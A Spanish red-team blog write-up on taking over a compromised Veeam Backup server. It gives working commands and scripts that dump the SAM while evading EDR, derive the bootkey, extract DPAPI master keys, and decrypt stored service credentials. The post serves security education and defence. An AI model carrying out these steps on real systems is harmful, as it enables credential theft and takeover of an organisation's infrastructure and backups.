---
title: "Veeam Backup: de seguro de la organización a llave maestra del atacante"
date: 2025-05-05T09:57:36+00:00
draft: false
author: "j0su"
tags: ["veeam", "dpapi", "credential-access", "edr-bypass", "active-directory", "red-team"]
categories: ["writeups"]
summary: "Veeam Backup, ¿qué pasaría si esta solución de protección se convirtiera en la puerta de entrada para un actor malicioso? Dos aproximaciones para volcar la SAM y extraer las master keys de DPAPI evadiendo AV/EDR, usando Veeam como pivote hacia los servicios críticos."
cover:
  image: "cover.png"
  alt: "Veeam Backup: de seguro a llave maestra del atacante"
  relative: true
ShowToc: true
TocOpen: false
---

> Esto no es contenido nuevo: es una adaptación de un artículo que escribí en su día y que se publicó originalmente en [Security Art Work](https://www.securityartwork.es/2025/05/05/veeam-backup/) (S2GRUPO) el 5 de mayo de 2025. He reescrito la redacción para darle el tono de este blog, pero el contenido técnico es el mismo.

## Introducción

Seguro que conoces Veeam Backup. Es la solución de protección de datos que hace copias de seguridad y recuperaciones en entornos virtuales, físicos, NAS y en la nube. Su facilidad de uso y su eficiencia lo han convertido en una pieza central de la estrategia de backup de muchas organizaciones, y más ahora, con el ransomware a la orden del día y la continuidad del negocio en el punto de mira.

Pero hagámonos una pregunta incómoda: ¿y si esa misma solución que te protege se convirtiera en la puerta de entrada del atacante?

Una de las grandes ventajas de Veeam es lo bien que se integra con el resto del entorno: vSphere (la plataforma de virtualización de VMware), sistemas NAS para almacenamiento en red o soluciones cloud como Azure. Toda esa automatización es comodísima, pero tiene letra pequeña: la autenticación. Para hablar con esos servicios, Veeam necesita credenciales. Y por el tipo de tareas que ejecuta, esas credenciales suelen tener privilegios elevados.

Ahí está el problema. Veeam no es crítico solo por lo que hace, sino por lo que guarda: un cofre de credenciales con acceso a media infraestructura. Para un atacante, eso es un objetivo de primera.

Y conviene pararse en el impacto, porque es lo que de verdad importa. Quien controla Veeam no se lleva una credencial suelta: se lleva las llaves de vSphere (y con ellas, de todas las máquinas virtuales), de los NAS donde viven los datos y de la nube. Pero hay algo peor. Veeam es tu plan B, el que se supone que te salva cuando entra un ransomware. Si el atacante lo compromete, no solo puede cifrar tus datos: puede borrar o cifrar también las copias de seguridad y dejarte sin nada a lo que volver. Pasa de robarte a quitarte la red de seguridad. Por eso comprometer Veeam no es un hallazgo más en un informe: muchas veces es el game over de la organización.

![Veeam, el seguro de la organización, convertido en la llave maestra que abre vSphere, NAS, la nube y las credenciales](cover.png)

¿Y dónde guarda Veeam esas credenciales? En su base de datos de configuración (*Veeam Backup & Replication Configuration Database*), donde almacena la información de la infraestructura de respaldo, las tareas, las sesiones y, entre otras cosas, las credenciales para conectarse a otros servicios. Esa base de datos puede vivir en un Microsoft SQL Server (MSSQL) o en PostgreSQL, en local (el mismo servidor que Veeam) o en remoto.

Guardar credenciales en texto plano no es opción, así que Veeam usa la Data Protection API (DPAPI) de Microsoft para cifrarlas y guardarlas como blobs de datos. Para quien no la conozca: DPAPI es una API de cifrado de Windows, muy usada junto al Windows Credential Manager, donde guarda credenciales de navegadores, de Remote Desktop Protocol (RDP) y de otras aplicaciones.

Entonces, ¿cómo aprovecha un adversario todo esto? Tanto un atacante real como un operador de Red Team trabajan parecido: con un objetivo claro, de forma sigilosa y sin levantar alarmas. Y un sistema que gestiona backups e interactúa con servicios tan críticos como vSphere es, si cae, una brecha de altísimo impacto.

La diferencia está en la intención. El adversario busca hacer daño, por ejemplo cifrando datos (T1486 - Data Encrypted for Impact) para tumbar la disponibilidad del negocio. El operador de Red Team, dentro de un ejercicio de simulación de adversarios, hace lo mismo pero para demostrar el impacto real que tendría ese atacante, partiendo de un escenario y unos objetivos pactados.

Muchas organizaciones confían en su EDR para frenar esto. Pero, ¿y si tanto el atacante como el Red Team dan por hecho que ese EDR está ahí y diseñan sus técnicas precisamente para evadirlo?

En este artículo verás dos aproximaciones, usadas en uno de los últimos ejercicios, que permitieron volcar la Security Account Manager (SAM) (T1003.002 - Security Account Manager) y acceder a las master keys que DPAPI usa para cifrar y descifrar los blobs, todo ello en entornos con antivirus (Windows Defender, BitDefender) y EDR (CrowdStrike). Con ellas, un atacante podría usar Veeam Backup como puerta de entrada para comprometer y controlar múltiples servicios críticos de la organización.

## Prueba de Concepto (PoC)

Para esta PoC partimos de un supuesto: el atacante ya tiene control con privilegios elevados sobre el equipo donde corre Veeam Backup y acceso a él. Y un detalle que no es menor: el entorno de las pruebas tenía el Endpoint Detection and Response (EDR) de CrowdStrike vigilando.

### Localizar el servidor de Veeam

Lo primero es localizar el servidor donde vive Veeam. Una vía cómoda es BloodHound (S0521 - BloodHound), que enumera entornos Active Directory (AD) y, entre otras cosas, te deja ver los Service Principal Names (SPNs) asociados a los objetos del dominio.

![Enumeración de SPNs con BloodHound para localizar el servidor de Veeam](image003.png)

Con el servidor localizado, toca conectarse a la máquina objetivo, por ejemplo por Remote Desktop Protocol (RDP) (T1021.001 - Remote Desktop Protocol) con una cuenta de privilegios elevados.

### Acceder a la base de datos y extraer las credenciales

El siguiente paso es averiguar dónde está la base de datos de Veeam, cómo se llama (instancia y base de datos) y de qué tipo es. Todo eso está en esta clave del registro de Windows:

```text
HKEY_LOCAL_MACHINE\SOFTWARE\Veeam\Veeam Backup and Replication
```

Con esos datos, accedemos (T1005 - Data from Local System) a la base de datos con cualquier gestor compatible con Microsoft SQL Server (MSSQL) o PostgreSQL, según el tipo que hayamos visto. Un par de herramientas portables que van bien:

- [Azure Data Studio](https://learn.microsoft.com/en-us/azure-data-studio/): cliente multiplataforma de Microsoft para Microsoft SQL Server y PostgreSQL.
- [DBeaver](https://dbeaver.io/): cliente universal de bases de datos, gratuito y portable.

![Clave de registro con la configuración de la base de datos de Veeam](image005.png)

Ya dentro, toca enumerar las credenciales que Veeam guarda en su base de datos, que están cifradas. Para sacarlas, esta consulta SQL:

```sql
SELECT * FROM VeeamBackup.dbo.Credentials
```

![Credenciales cifradas almacenadas en la base de datos de Veeam](image007.png)

### Volcar la SAM

Con las credenciales cifradas en la mano, empieza la segunda fase: extraer las master keys del Data Protection API (DPAPI), las que cifran y descifran esas credenciales.

Aprovechando los privilegios elevados sobre el servidor de Veeam, vamos a volcar la Security Account Manager (SAM) (T1003.002 - Security Account Manager). De ese volcado sacaremos los valores `DPAPI_MACHINEKEY` y `DPAPI_USERKEY`, que luego usaremos para extraer las master keys de la cuenta máquina.

La aproximación para volcar la SAM es esta:

Con el acceso por Remote Desktop Protocol (RDP) (T1021.001 - Remote Desktop Protocol), montamos un recurso compartido en la máquina víctima con la herramienta PsExec (S0029 - PsExec), de la suite SysInternals de Microsoft.

Con PsExec lanzamos el RegEdit (Editor de Registros) como `NT Authority\System`: necesitamos ese nivel de privilegio para volcar la SAM.

```cmd
PsExec64.exe -s -i regedit
```

Con el Editor de Registros abierto, exporta en formato `.reg` estos registros:

```text
HKEY_LOCAL_MACHINE\SAM
HKEY_LOCAL_MACHINE\SECURITY
```

![Exportación de las claves SAM y SECURITY desde RegEdit](image009.png)

Y, por otro lado, exporta en formato `.txt` este otro:

```text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
```

![Exportación del registro LSA en formato texto](image011.png)

Para exportar una clave: clic derecho sobre el registro, *“Exportar”* y eliges el formato (`.reg` o `.txt`).

![Menú contextual de exportación en RegEdit](image013.png)

Los registros `SAM` y `SECURITY` solo se pueden volcar en binario, así que usamos este script de PowerShell para moverlos temporalmente a `HKCU\HELLO`, reimportarlos y guardarlos como ficheros `.hive`. Así esquivamos las protecciones que vigilan el acceso directo a estas claves:

```powershell
# Ubicación de los ficheros exportados
$files = @(
    "C:\Users\Public\Documents\sam.reg",
    "C:\Users\Public\Documents\sec.reg"
)

# Modificar la ubicación de los registros
Write-Output "Switching HKLM\ to HKCU\HELLO in .reg files"
foreach ($filePath in $files) {
    $content = Get-Content -Path $filePath -Raw -Encoding Unicode
    $replacement = [char[]] "HKEY_CURRENT_USER\HELLO" -join ''
    $updatedContent = $content -replace "HKEY_LOCAL_MACHINE", $replacement
    Set-Content -Path $filePath -Value $updatedContent -Encoding Unicode
    Write-Output "`tUpdated file: $filePath"
}

# Importar los registros a la nueva ubicación
Write-Output "Importing modified .reg files in HKCU\HELLO"
reg import C:\Users\Public\Documents\sam.reg
reg import C:\Users\Public\Documents\sec.reg

# Obtener los registros mediante reg save
Write-Output "Reg saving back to .hive"
reg save HKEY_CURRENT_USER\HELLO\SAM C:\Users\Public\Documents\SAM.hive
reg save HKEY_CURRENT_USER\HELLO\SECURITY C:\Users\Public\Documents\SECURITY.hive

# Eliminar la clave temporal
Write-Output "Removing temporary HKCU\HELLO hives"
reg delete HKEY_CURRENT_USER\HELLO /f
```

Del registro LSA que exportamos en `.txt` necesitamos cuatro valores, guardados en el atributo *Class Name*:

```text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\GBG
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Data
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\JD
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Skew1
```

![Valores Class Name de las claves LSA: GBG, Data, JD y Skew1](image015.png)

### Obtener la BootKey y los hashes

Esos cuatro valores van al siguiente script, que calcula la BootKey necesaria para descifrar los datos del volcado de la SAM (T1003.002 - Security Account Manager).

```python
# Valores hexadecimales para JD, Skew1, GBG y Datos
jd = bytes.fromhex("$JD")
skew1 = bytes.fromhex("$SKEW1")
gbg = bytes.fromhex("$GBG")
data = bytes.fromhex("$DATA")

# Combinar los datos binarios
combined = jd + skew1 + gbg + data

# Tabla de permutación para la Bootkey
permutation = [0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3, 0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7]

# Reorganizar los bytes para generar la Bootkey
bootkey = bytes([combined[i] for i in permutation])

# Imprimir la Bootkey en formato hexadecimal
print("Bootkey:", bootkey.hex())
```

![Obtención de la BootKey a partir de los valores de LSA](image017.png)

Con la BootKey ya podemos acceder a los hashes de la SAM en local, con herramientas como impacket-secretsdump (S0357 - impacket-secretsdump) o similares.

```bash
impacket-secretsdump -sam SAM.hive -security SECURITY.hive -bootkey $BOOTKEY LOCAL
```

### Extraer las master keys de DPAPI

De todo lo que devuelve secretsdump nos quedamos con las dos claves que ya mencionamos: `DPAPI_MACHINEKEY` y `DPAPI_USERKEY`. Con ellas extraeremos las master keys de la cuenta máquina, y para eso usamos [dploot](https://github.com/zblurx/dploot).

dploot interactúa con el Windows Credential Manager y con el Data Protection API (DPAPI) en local: puedes montar en una máquina que controlas el sistema de archivos de la víctima y, desde ahí, extraer las master keys.

Para montar el sistema de archivos, una aproximación posible:

```bash
sudo mount -t cifs //$IP/$RECURSO /mnt/tmp -o username=$USUARIO,password=$CONTRASEÑA,domain=$DOMINIO
```

Con el sistema de archivos montado, extraemos las master keys de la cuenta máquina: son las claves con las que Veeam cifra las credenciales, así que las necesitamos para descifrarlas.

```bash
dploot machinemasterkeys -root /mnt/tmp -u $USUARIO -p $PASSWORD -t LOCAL \
  -dpapi-system-key 'dpapi_machinekey:$DPAPI_MACHINEKEY,dpapi_userkey:$DPAPI_USERKEY'
```

![Extracción de las master keys de la cuenta máquina con dploot](image019.png)

### Descifrar las credenciales

Con las master keys ya extraídas, el último paso es descifrar los blobs de datos, que no son otra cosa que las credenciales que sacamos antes del *Veeam Backup & Replication Configuration Database*.

dploot hace algo parecido a una fuerza bruta: prueba cada master key del archivo contra el blob hasta dar con la que lo descifra.

```bash
dploot blob -blob "$BLOB" -mkfile $ARCHIVO_MASTERKEYS -t LOCAL
```

![Descifrado del blob y obtención de la credencial en claro](image022.png)

Y con esas credenciales en claro se abre la puerta a todos los servicios críticos conectados a Veeam: control y privilegios elevados sobre el entorno IT, y vía libre para ir a por los objetivos de negocio de la organización.

## Conclusión

Este ejemplo deja claro cómo un adversario puede acabar tomando el control de la infraestructura IT de una organización, incluso con una solución de seguridad como un Endpoint Detection and Response (EDR) de por medio.

Y, sobre todo, deja una idea incómoda: un software pensado para proteger los datos frente a ataques como el ransomware puede convertirse en la vía de entrada del atacante, dándole acceso a múltiples servicios críticos y abriendo una brecha de alto impacto. La herramienta que te salva es también la que, mal protegida, te hunde.

## Referencias

1. dploot — herramienta para interactuar con el Windows Credential Manager y el Data Protection API (DPAPI), extraer las master keys y descifrar los blobs. [github.com/zblurx/dploot](https://github.com/zblurx/dploot)
2. Orange Cyberdefense — _Bypassing EDR to dump LSA secrets_. [orangecyberdefense.com](https://www.orangecyberdefense.com/global/blog/cybersecurity/bypassing-edr-to-dump-lsa-secrets)
